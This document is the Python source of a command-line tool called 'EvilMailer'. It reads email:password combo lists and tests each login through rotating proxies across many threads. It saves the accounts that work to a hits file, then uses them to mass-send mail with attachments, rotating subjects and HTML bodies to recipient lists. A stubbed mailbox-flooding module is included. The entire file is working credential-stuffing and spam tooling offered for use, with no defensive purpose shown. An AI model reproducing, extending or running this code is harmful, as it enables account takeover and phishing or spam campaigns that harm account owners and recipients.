from utilities import get_recipient_emails, get_sender_credentials, grab_proxy, get_files
from concurrent.futures import ThreadPoolExecutor
from Sender import Sender
import random
import time
import glob
import itertools
from collections import deque
import os
from colorama import Fore, init


class EvilMailer:
    def __init__(self):
        # initialize colorama
        init()
        # user data
        self.credentials_list = None
        self.receipt_list = None
        self.proxy_list = None
        self.hits_filename = None
        self.email_subject = []
        self.email_body = []
        self.email_attach = None
        self.html_body = False
        self.image_url = None
        self.emails_per_account = 10
        self.threads = 100
        self.done_receipt_list = deque([])
        
        # checker_data
        self.hits = 0
        self.retries = 0
        self.fails = 0
        self.mails_sent = 0
        self.total_checked = 0
        self.done_tasks_from_last_minute = deque([0 for _ in range(30)])
        self.cpm = 0
        self.logo = Fore.GREEN + r"""
  ______     _ _ __  __       _ _            
 |  ____|   (_) |  \/  |     (_) |           
 | |____   ___| | \  / | __ _ _| | ___ _ __  
 |  __\ \ / / | | |\/| |/ _` | | |/ _ \ '__| 
 | |___\ V /| | | |  | | (_| | | |  __/ |    
 |______\_/ |_|_|_|  |_|\__,_|_|_|\___|_|    
                                             
                                             
"""

    def crack_mail(self, credentials: str):
        """
        checks Mail-Access
        :param str credentials: credentials in format email:password
        :return: Sender object | None
        """
        retries = 0
        while retries < 10:
            if self.proxy_list:
                proxy = random.choice(self.proxy_list)
            else:
                proxy = None
            sender = Sender(credentials=credentials, proxy=proxy)
            if not sender:
                self.fails += 1
                return None
            result = sender.login()
            if result == "Fail":
                self.fails += 1
                return None
            elif result == "Success":
                self.hits += 1
                if self.hits_filename:
                    with open(self.hits_filename, "a") as f:
                        f.write(f"{credentials}\n")
                return sender
            else:
                self.retries += 1
                retries += 1
        self.fails += 1
        return None

    def send_mails(self, credentials: str, recipients: list):
        """
        Tries to send mails from cracked-account to recipients
        :param str credentials: credentials in format email:password for mail-access
        :param list recipients: recipient emails
        :returns: True | False
        """
        if len(recipients) > 0:
            sender = self.crack_mail(credentials)
        else:
            return None
        if sender and sender.get_token():
            if self.email_attach != None:
                if sender.prepare_file(self.email_attach) != "Success":
                    self.fails += len(recipients)
                    return None
            if sender.send_email(recipients, random.choice(self.email_subject), random.choice(self.email_body), self.html_body) == "Success":
                self.done_receipt_list += recipients
                self.mails_sent += len(recipients)
            else:
                self.fails += len(recipients)
        else:
            return False
        return True

    def thread_finished(self, _):
        """
        Callback function for threads
        """
        self.total_checked += 1

    def threaded_mails(self, func: object, threads: int = 100):
        """
        making a target function threaded
        :param object func: target function wich shoud be running threaded
        :param int threads: number of threads
        """
        # initialize Executor + Tasks
        executor = ThreadPoolExecutor(max_workers=threads)
        if func.__name__ == "crack_mail":
            # Crack mails
            tasks = [executor.submit(func, credential) for credential in self.credentials_list]

        elif func.__name__ == "send_mails":
            # Send mails
            random.shuffle(self.credentials_list)
            args = ((credential, [self.receipt_list.popleft() for _ in range(self.emails_per_account) if
                                  len(self.receipt_list) > 0]) for credential in self.credentials_list)
            tasks = [executor.submit(func, *arg) for arg in args]
        for task in tasks:
            task.add_done_callback(self.thread_finished)
        number_of_tasks = len(tasks)
        # Some status informations
        save_mark = 0
        while self.total_checked < number_of_tasks:
            self.print_checker_data(func)
            save_mark += 1
            time.sleep(2)
            if save_mark == 5:
                save_mark = 0
                with open("done_receipt.txt", "a") as f:
                    f.writelines([self.done_receipt_list.popleft() + "\n" for _ in range(len(self.done_receipt_list))])
            
        # Shutdown executor for clean finish
        executor.shutdown()
        self.print_checker_data(func)
        with open("done_receipt.txt", "a") as f:
            f.writelines([self.done_receipt_list.popleft() + "\n" for _ in range(len(self.done_receipt_list))])
        input(Fore.GREEN + "DONE!!")

    def start(self):
        """
        starts the main process with user entry's
        """
        while True:
            self.clear_screen()
            print("""MODULES
[1] Crack Emails
[2] Send Emails from Cracked Accounts
[3] Send a Test-Mail
[4] Flood one Target-Mail

Utils:
[5] Text Generator for rotating Bodies

""")
            user_choice = input("Type the number of a module: ")
            if user_choice.strip() == "1":
                # Module: Crack Emails
                self.clear_screen()
                # load credentials
                self.load_data("credentials")
                # set proxy
                self.clear_screen()
                use_proxy = input("Use Proxy? (y/n): ").lower()
                if "y" in use_proxy:
                    print("Choose proxy-type:\n[0]-http\n[1]-socks4\n[2]-socks5\n")
                    user_proxy_type = input("Enter a number: ")
                    self.clear_screen()
                    if user_proxy_type == "1":
                        proxy_type = "socks4 proxy"
                    elif user_proxy_type == "2":
                        proxy_type = "socks5 proxy"
                    else:
                        proxy_type = "http proxy"
                    self.load_data(proxy_type)
                # Ask for default settings
                self.clear_screen()
                default_settings = input("DEFAULT SETTINGS:\n100 Threads\n\nDo you want to use default settings? (y/n): ").strip().lower()
                if "n" in default_settings:
                    self.change_settings("threads")
                self.clear_screen()
                # set hitfile
                hitfile = input("Please enter a Name for the hitfile: ")
                if ".txt" != hitfile[-4:]:
                    hitfile += ".txt"
                self.hits_filename = f"hits/{hitfile}"
                print(f"Mailaccess Hits will be stored here: {self.hits_filename}")
                # start cracking 
                input("press Enter to start cracking!")
                self.threaded_mails(self.crack_mail)

            elif user_choice.strip() == "2":
                # Module: Send Emails
                self.clear_screen()
                # Load credentials
                self.load_data("credentials")
                self.clear_screen()
                # Load Proxy
                use_proxy = input("Use Proxy? (y/n): ").lower()
                if "y" in use_proxy:
                    print("Choose proxy-type:\n[0]-http\n[1]-socks4\n[2]-socks5\n")
                    user_proxy_type = input("Enter a number: ")
                    self.clear_screen()
                    if user_proxy_type == "1":
                        proxy_type = "socks4 proxy"
                    elif user_proxy_type == "2":
                        proxy_type = "socks5 proxy"
                    else:
                        proxy_type = "http proxy"
                    self.load_data(proxy_type)
                # Load receipt emails
                self.clear_screen()
                self.load_data("receipt")
                # Ask for default settings
                self.clear_screen()
                default_settings = input("DEFAULT SETTINGS:\n100 Threads\n10 Mails will be sent per cracked Account\n\nDo you want to use default settings? (y/n): ").strip().lower()
                if "n" in default_settings:
                    self.change_settings("threads")
                    self.change_settings("emails_per_account")
                # Load email-data
                self.clear_screen()
                add_files = input("Do you want to add a File as Attachment to the Email? (y/n): ")
                # Load Email-Attachment-Files
                if "y" in add_files:
                    self.load_data("attach")
                self.clear_screen()
                is_rotating = input("Are you using rotating Subjects and Bodys? (y/n): ").lower()
                if "y" in is_rotating:
                    self.clear_screen()
                    html_files = input("Do you want to send rotating html templates? (y/n): ").lower()
                    if "y" in html_files:
                        self.html_body = True
                    self.clear_screen()
                    self.get_rotating_files(self.html_body)
                    input("Press Enter to Start!")
                    return self.threaded_mails(self.send_mails)
                    
                # Email-Body is HTML
                is_html = input("Is the Email-Body in 'email_data/email_data.txt' HTML? (y/n): ")
                if "y" in is_html.lower():
                    self.html_body = True
                else:
                    # Add inline Image with web source
                    self.clear_screen()
                    inline_image = input("Do you want to add a web-link for an image, to display it in your email-body? (y/n): ")
                    if "y" in inline_image:
                        self.clear_screen()
                        self.image_url = input("Please enter the source-link to that Image (e.g. 'https://www.example.com/img-1.jpg'): ").strip()
                
                # Email Data
                self.clear_screen()
                print("EMAIL-DATA\n")
                with open("email_data/email_data.txt", "rb") as file:
                    data = file.read().decode("utf-8")
                self.email_subject = [data.split("\n")[0].replace("subject:", "").strip()]
                self.email_body = [data.split("body:")[-1].strip()]
                if self.html_body:
                    self.email_body = [self.email_body[0].replace("\t", "").replace("\n", "")]
                elif self.image_url:
                    self.html_body = True
                    self.email_body = [f'<img src="{self.image_url}" width="360"><br><p>{self.email_body[0]}</p>'.replace("\n", "</p><br><p>")]
                if self.email_attach:
                    print("Email-Attachment-File: " + self.email_attach)
                print("Email-Subject: " + self.email_subject[0])
                print("Email-Body: " + self.email_body[0])
                # start send mails
                input("\npress Enter to start sending Mails!")
                return self.threaded_mails(self.send_mails)
            
            elif user_choice.strip() == "3":
                #Test single Mail
                self.clear_screen()
                credentials = input("Please enter your credentials (email:password): ").strip()
                self.clear_screen()
                try:
                    sender = self.crack_mail(credentials)
                except:
                    input("Something went wrong!")
                if not sender:
                    input("Login failed!")
                else:
                    print("Login successful!")
                    time.sleep(3)
                    self.clear_screen()
                    receipt = input("Enter a receipt email: ").strip()
                    self.clear_screen()
                    print("EMAIL-DATA\n")
                    with open("email_data/email_data.txt", "rb") as file:
                        data = file.read().decode("utf-8")
                    self.email_subject = [data.split("\n")[0].replace("subject:", "").strip()]
                    self.email_body = [data.split("body:")[-1].strip()]
                    print("Email-Subject: " + self.email_subject[0])
                    print("Email-Body: " + self.email_body[0])
                    input("\npress Enter to start sending the Mail!")
                    self.send_mails(credentials, [receipt])
                    self.print_checker_data(self.send_mails)
                    input("Done!!")
                    
            elif user_choice.strip() == "4":
                input("Not done yet")
                
            elif user_choice.strip() == "5":
                # Text Generator
                self.clear_screen()
                input("Welcome to the Text Generator!\nPlease edit the 'email_data/rotating/generate.txt' file, press Enter to generate texts!")
                self.clear_screen()
                try:
                    with open("email_data/rotating/generate.txt", encoding="utf-8") as f:
                        data = [line.strip() for line in f.readlines() if line.strip() != ""]
                    all_variants = []
    
                    for line in data:
                        all_variants.append([t.strip() for t in line.split("/")])
                    results = list(itertools.product(*all_variants))
                    # Delete existing files
                    print("Deleting existing Files...")
                    files_del = glob.glob('email_data/rotating/rotating_body/*.txt')
                    for file in files_del:
                        os.remove(file)
                    self.clear_screen()
                    # create the text files
                    print(f"{len(results)} Texts Generated!")
                    print("saving Texts....")
                    for num, res in enumerate(results):
                        text = " ".join(res)
                        with open(f"email_data/rotating/rotating_body/text-{num}.txt", "w") as fwr:
                            fwr.write(text)
                    input("Done!! Press enter!")
                except:
                    input("Something went wrong!")
            else:
                # Invalid Module
                input("Invalid entry! Press enter to retry!")

    def get_rotating_files(self, html_files: bool = False):
        """
        gets rotating email data
        :param bool html_files: html bodies in email data
        """
        if html_files:
            body_files = glob.glob("email_data/rotating/rotating_body/*.html")
        else:
            body_files = glob.glob("email_data/rotating/rotating_body/*.*")
        for file in body_files:
            with open(file, "rb") as f:
                data = f.read().decode("utf-8")
                if html_files:
                    data = data.replace("\t", "").replace("\n", "")
                self.email_body.append(data)
        with open("email_data/rotating/subjects.txt", "rb") as f:
            self.email_subject = [sub.decode("utf-8").strip() for sub in f.readlines() if sub.strip()!=""]
        print(f"{len(self.email_subject)} Subjects loaded\n{len(self.email_body)} Bodys loaded")
        time.sleep(2)

    def change_settings(self, change_prop: str):
        """
        changes the Threads and Mails per Cracked Account
        :param str change_prop: threads|emails_per_account, which property will be changed 
        """
        if change_prop == "threads":
            prompt = "How many Threads do you want?: "
        else:
            prompt = "How many Mails should be sent per Cracked Account?: "
        while True:
            try:
                self.clear_screen()
                user_entry = int(input(prompt).strip())
                break
            except ValueError:
                input("Please type a Number! Press enter to retry!")
        if change_prop == "threads":
            self.threads = user_entry
        else:
            self.emails_per_account = user_entry
                

    def load_data(self, type: str):
        """
        helps to load user data from files
        :param str type: type of data wich should be loaded
        """
        if type == "credentials":
            # Load email:password list
            loading_str = "'mail:pass' Wordlist"
            directory = "wordlists/"
        elif "proxy" in type:
            # Load proxy list
            loading_str = "Proxies"
            directory = "proxy/"
        elif type == "attach":
            # Load email-attach-file
            loading_str = "Email-File-Attachment"
            directory = "email_data/files/"
        else:
            # Load receipt list
            loading_str = "Receipt Wordlist"
            directory = "wordlists/"
        print(f"Load {loading_str}...")
        combo_path = get_files(directory, loading_str)
        while combo_path is None:
            input("Invalid Entry! Hit enter to reload!")
            self.clear_screen()
            print(f"Load {loading_str}...")
            combo_path = get_files(directory, loading_str)
        if type == "credentials":
            self.credentials_list = get_sender_credentials(combo_path)
            print(f"{len(self.credentials_list)} {type} loaded!")
        elif "proxy" in type:
            proxy_type = type.replace(" proxy", "")
            self.proxy_list = grab_proxy(proxy_type, combo_path)
            print(f"{len(self.proxy_list)} {type} loaded!")
        elif type == "attach":
            self.email_attach = combo_path
            print("File Loaded!")
        else:
            try:
                # Filter receipt-emails which are used before
                with open("done_receipt.txt") as f:
                    used_mails = set([mail.strip() for mail in f.readlines()])
                self.receipt_list = deque(set(get_recipient_emails(combo_path)) - used_mails)
            except FileNotFoundError:
                self.receipt_list = get_recipient_emails(combo_path)
            print(f"{len(self.receipt_list)} {type} loaded!")
        time.sleep(1.5)

    def print_checker_data(self, func: object):
        """
        print status-information like CPM and success/fail/ban tasks
        :param object func: target function to differentiate between the outputs
        """
        self.clear_screen()

        if func.__name__ == "crack_mail":
            # CPM-Calculation (checks/tasks per minute)
            self.cpm = self.total_checked - self.done_tasks_from_last_minute.popleft()
            self.done_tasks_from_last_minute.append(self.total_checked)
            data = f"{Fore.WHITE}Checked: {self.total_checked}\n{Fore.LIGHTGREEN_EX}Hits: {self.hits}\n{Fore.LIGHTRED_EX}Fails: {self.fails}\n{Fore.LIGHTYELLOW_EX}Retries: {self.retries}\n{Fore.LIGHTBLUE_EX}CPM: {self.cpm}"
        elif func.__name__ == "send_mails":
            self.cpm = self.mails_sent - self.done_tasks_from_last_minute.popleft()
            self.done_tasks_from_last_minute.append(self.mails_sent)
            data =  f"{Fore.LIGHTGREEN_EX}Mails sent: {self.mails_sent}\n{Fore.LIGHTRED_EX}Fails: {self.fails}\n{Fore.LIGHTBLUE_EX}CPM: {self.cpm}"
        else:
            data = str()
        print(data)

    def clear_screen(self):
        """
        Clears the Console
        """
        if os.name == "nt":
            os.system("cls")
            print(self.logo)
        else:
            os.system("clear")
            print(self.logo)


if __name__ == "__main__":
    checker = EvilMailer()
    checker.start()
